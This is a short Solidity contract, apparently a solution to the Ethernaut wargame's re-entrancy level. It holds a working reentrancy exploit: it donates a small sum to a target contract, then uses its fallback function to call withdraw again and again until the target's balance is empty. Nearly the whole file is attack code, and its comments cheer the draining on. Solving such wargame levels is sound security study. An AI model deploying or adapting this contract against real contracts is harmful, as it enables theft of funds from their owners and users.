pragma solidity ^0.6.10;

// We need to import the Reentrance code so that this contract has an understanding
// of the interfaces it will be calling 
import './Reentrancy.sol';


contract EthernautReentrancyAttack {
    Reentrance target;
    uint public amount = .001 ether; // amount to withdraw each time 

    // Passing the contract that we want to attack as the 
    
    constructor(address payable _targetAddr) public payable {
        // We don't want to  use the "new" keyword here as we want the variable "target" to be a reference to 
        // the deployed target contract address
        target = Reentrance(_targetAddr);
    }

    // We need to donate to give our account in the target contract an amount of eth.
    // This allows us to take advantage of the Reentrancy in the withdrawl function.
    function donateToTarget() public {
        target.donate.value(amount).gas(40000000)(address(this));
    }

    fallback() external payable {
        // If the balance of the target contract isn't equal to zero, keep going :D
        if (address(target).balance != 0 ){
            // This recursively will call withdrawl
            target.withdraw(amount);
        }
    }
}
